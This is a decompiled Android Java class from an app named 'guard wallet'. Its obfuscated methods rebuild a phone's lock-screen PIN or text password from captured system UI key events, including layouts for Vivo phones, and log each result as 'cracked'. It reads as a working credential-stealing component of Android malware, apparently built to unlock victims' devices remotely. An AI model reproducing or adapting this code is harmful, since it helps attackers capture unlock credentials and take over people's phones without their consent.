package com.guard.wallet.plug;

import a1.AbstractC0026q;
import android.text.TextUtils;
import android.util.Log;
import com.guard.wallet.helper.RunnableC0183f;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import com.guard.wallet.entity.BuildConfig;
import p011n.C0404a;

/* renamed from: com.guard.wallet.plug.c */
/* loaded from: classes.dex */
public final class C0224c implements Serializable {

    /* renamed from: a */
    public static final ConcurrentLinkedQueue f261a = new ConcurrentLinkedQueue();

    /* renamed from: b */
    public static final LinkedList f262b = new LinkedList();

    /* renamed from: c */
    public static final ScheduledExecutorService f263c = Executors.newSingleThreadScheduledExecutor();

    /* renamed from: d */
    public static final AtomicReference f264d = new AtomicReference(null);

    /* renamed from: e */
    public static final AtomicBoolean f265e = new AtomicBoolean(false);

    /* renamed from: f */
    public static long f266f;

    /* renamed from: g */
    public static String f267g;

    public C0224c() {
        f266f = 10L;
    }

    /* renamed from: a */
    public static void m445a(LinkedList linkedList, ReqUnlockDeviceVO reqUnlockDeviceVO) {
        if (linkedList.isEmpty()) {
            return;
        }
        linkedList.sort(new C0404a(1));
        ReqUnlockDeviceVO m452h = m452h(linkedList);
        if (m452h == null || AbstractC0026q.m151B(m452h.getTextCipher())) {
            return;
        }
        Log.d("com.guard.wallet.plug.c", "按ID破解:" + m452h.getTextCipher());
        reqUnlockDeviceVO.setCipherGradeCode(m452h.getCipherGradeCode());
        reqUnlockDeviceVO.setTextCipher(m452h.getTextCipher());
    }

    /* renamed from: b */
    public static void m446b(LinkedList linkedList, ReqUnlockDeviceVO reqUnlockDeviceVO) {
        if (linkedList.isEmpty()) {
            return;
        }
        linkedList.sort(new C0404a(1));
        ReqUnlockDeviceVO m452h = m452h(linkedList);
        if (m452h == null || AbstractC0026q.m151B(m452h.getTextCipher())) {
            return;
        }
        Log.d("com.guard.wallet.plug.c", "按DESC破解:" + m452h.getTextCipher());
        if (AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
            reqUnlockDeviceVO.setCipherGradeCode(m452h.getCipherGradeCode());
        }
        if (AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher()) || m449e(reqUnlockDeviceVO.getTextCipher(), reqUnlockDeviceVO.getTextCipher())) {
            reqUnlockDeviceVO.setTextCipher(m452h.getTextCipher());
        }
    }

    /* renamed from: c */
    public static void m447c(LinkedList linkedList, ReqUnlockDeviceVO reqUnlockDeviceVO) {
        if (linkedList.isEmpty()) {
            return;
        }
        linkedList.sort(new C0404a(1));
        ReqUnlockDeviceVO m453i = m453i(linkedList);
        if (m453i == null || AbstractC0026q.m151B(m453i.getTextCipher())) {
            return;
        }
        Log.d("com.guard.wallet.plug.c", "按文本破解:" + m453i.getTextCipher());
        if (AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
            reqUnlockDeviceVO.setCipherGradeCode(m453i.getCipherGradeCode());
        }
        if (AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher()) || m449e(reqUnlockDeviceVO.getTextCipher(), reqUnlockDeviceVO.getTextCipher())) {
            reqUnlockDeviceVO.setTextCipher(m453i.getTextCipher());
        }
    }

    /* renamed from: d */
    public static boolean m448d(String str) {
        if (AbstractC0026q.m151B(str) || str.length() < 4) {
            return false;
        }
        ReqUnlockDeviceVO m703g = AbstractC0252h.m703g();
        if (m703g != null && !AbstractC0026q.m151B(m703g.getTextCipher())) {
            String textCipher = m703g.getTextCipher();
            if ((!Objects.equals(textCipher, str) && textCipher.startsWith(str)) || textCipher.endsWith(str)) {
                return false;
            }
        }
        ReqUnlockDeviceVO m702f = AbstractC0252h.m702f();
        if (m702f == null || AbstractC0026q.m151B(m702f.getTextCipher())) {
            return true;
        }
        String textCipher2 = m702f.getTextCipher();
        return Objects.equals(textCipher2, str) || !(textCipher2.startsWith(str) || textCipher2.endsWith(str));
    }

    /* renamed from: e */
    public static boolean m449e(String str, String str2) {
        if (AbstractC0026q.m151B(str2) || AbstractC0026q.m151B(str)) {
            return false;
        }
        return (Objects.equals(str, str2) || !str.startsWith(str2)) && !str.endsWith(str2);
    }

    /* renamed from: f */
    public static void m450f() {
        if (AbstractC0026q.m151B(f267g) || !f265e.get()) {
            Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clear");
            f261a.clear();
            f267g = null;
        }
    }

    /* renamed from: g */
    public static void m451g() {
        AtomicBoolean atomicBoolean = f265e;
        if (atomicBoolean.get()) {
            return;
        }
        atomicBoolean.set(true);
        f263c.schedule(new RunnableC0183f(), f266f, TimeUnit.SECONDS);
    }

    /* renamed from: h */
    public static ReqUnlockDeviceVO m452h(LinkedList linkedList) {
        if (linkedList.isEmpty()) {
            return null;
        }
        LinkedList linkedList2 = new LinkedList();
        LinkedList linkedList3 = new LinkedList();
        LinkedList linkedList4 = new LinkedList();
        Iterator it = linkedList.iterator();
        while (it.hasNext()) {
            ListenPropResponse listenPropResponse = (ListenPropResponse) it.next();
            if (!AbstractC0026q.m151B(listenPropResponse.getValue())) {
                if (listenPropResponse.getValue().startsWith("com.android.systemui:id/key")) {
                    linkedList2.add(listenPropResponse.getValue().replaceFirst("com.android.systemui:id/key", BuildConfig.FLAVOR));
                }
                if (listenPropResponse.getValue().startsWith("com.android.systemui:id/VivoPinkey")) {
                    linkedList3.add(listenPropResponse.getValue().replaceFirst("com.android.systemui:id/VivoPinkey", BuildConfig.FLAVOR));
                }
                if (listenPropResponse.getValue().startsWith("com.android.systemui:id/num")) {
                    linkedList4.add(listenPropResponse.getValue().replaceFirst("com.android.systemui:id/num", BuildConfig.FLAVOR));
                }
                if (listenPropResponse.getValue().startsWith("com.android.systemui:id/char_")) {
                    linkedList4.add(listenPropResponse.getValue().replaceFirst("com.android.systemui:id/char_", BuildConfig.FLAVOR));
                }
                if (AbstractC0026q.m153D(listenPropResponse.getValue()) && listenPropResponse.getValue().length() == 1) {
                    linkedList2.add(listenPropResponse.getValue());
                }
            }
        }
        if (!linkedList2.isEmpty()) {
            String join = TextUtils.join(BuildConfig.FLAVOR, linkedList2);
            Log.d("com.guard.wallet.plug.c", "依 通用 PIN码破解:" + join);
            ReqUnlockDeviceVO reqUnlockDeviceVO = new ReqUnlockDeviceVO();
            reqUnlockDeviceVO.setTextCipher(join);
            reqUnlockDeviceVO.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
            return reqUnlockDeviceVO;
        }
        if (!linkedList3.isEmpty()) {
            String join2 = TextUtils.join(BuildConfig.FLAVOR, linkedList3);
            Log.d("com.guard.wallet.plug.c", "依 VIVO PIN码破解:" + join2);
            ReqUnlockDeviceVO reqUnlockDeviceVO2 = new ReqUnlockDeviceVO();
            reqUnlockDeviceVO2.setTextCipher(join2);
            reqUnlockDeviceVO2.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
            return reqUnlockDeviceVO2;
        }
        if (linkedList4.isEmpty()) {
            return null;
        }
        String join3 = TextUtils.join(BuildConfig.FLAVOR, linkedList4);
        ReqUnlockDeviceVO reqUnlockDeviceVO3 = new ReqUnlockDeviceVO();
        reqUnlockDeviceVO3.setTextCipher(join3);
        reqUnlockDeviceVO3.setCipherGradeCode("PASSWORD_QUALITY_ALPHANUMERIC");
        Log.d("com.guard.wallet.plug.c", "依 VIVO 文本密码破解:" + join3);
        return reqUnlockDeviceVO3;
    }

    /* renamed from: i */
    public static ReqUnlockDeviceVO m453i(LinkedList linkedList) {
        int i2;
        LinkedList linkedList2 = f262b;
        if (!linkedList2.isEmpty()) {
            linkedList.addAll(linkedList2);
            linkedList2.clear();
        }
        if (linkedList.isEmpty()) {
            return null;
        }
        LinkedList<String> linkedList3 = new LinkedList();
        Iterator it = linkedList.iterator();
        while (it.hasNext()) {
            ListenPropResponse listenPropResponse = (ListenPropResponse) it.next();
            if (!AbstractC0026q.m151B(listenPropResponse.getValue())) {
                linkedList3.add(listenPropResponse.getValue());
            }
        }
        linkedList3.sort(new C0404a(0));
        if (linkedList3.isEmpty()) {
            i2 = 0;
        } else {
            i2 = 0;
            for (String str : linkedList3) {
                if (!AbstractC0026q.m151B(str) && str.length() > i2) {
                    i2 = str.length();
                }
            }
        }
        String[] strArr = new String[i2];
        Arrays.fill(strArr, 0, i2, "*");
        for (String str2 : linkedList3) {
            if (!AbstractC0026q.m151B(str2)) {
                for (int i3 = 0; i3 < str2.length(); i3++) {
                    String valueOf = String.valueOf(str2.charAt(i3));
                    if (!Objects.equals(valueOf, "*")) {
                        strArr[i3] = valueOf;
                    }
                }
            }
        }
        String join = TextUtils.join(BuildConfig.FLAVOR, strArr);
        if (AbstractC0026q.m151B(join)) {
            return null;
        }
        Log.d("com.guard.wallet.plug.c", "已破解文本密码:" + join);
        if (join.contains("*") || join.length() != i2) {
            linkedList2.addAll(linkedList);
            return null;
        }
        ReqUnlockDeviceVO reqUnlockDeviceVO = new ReqUnlockDeviceVO();
        reqUnlockDeviceVO.setTextCipher(join);
        reqUnlockDeviceVO.setCipherGradeCode(AbstractC0026q.m153D(join) ? "PASSWORD_QUALITY_NUMERIC_COMPLEX" : "PASSWORD_QUALITY_ALPHANUMERIC");
        return reqUnlockDeviceVO;
    }

    /* renamed from: j */
    public static void m454j(ListenResponseVO listenResponseVO) {
        if (listenResponseVO.getResponses() == null || listenResponseVO.getResponses().isEmpty()) {
            return;
        }
        if (!AbstractC0026q.m151B(listenResponseVO.getDelegateId()) && AbstractC0026q.m151B(f267g)) {
            f267g = listenResponseVO.getDelegateId();
        }
        Log.d("com.guard.wallet.plug.c", "cacheResponseQueue offer:" + listenResponseVO.getResponses());
        f261a.addAll(listenResponseVO.getResponses());
    }
}
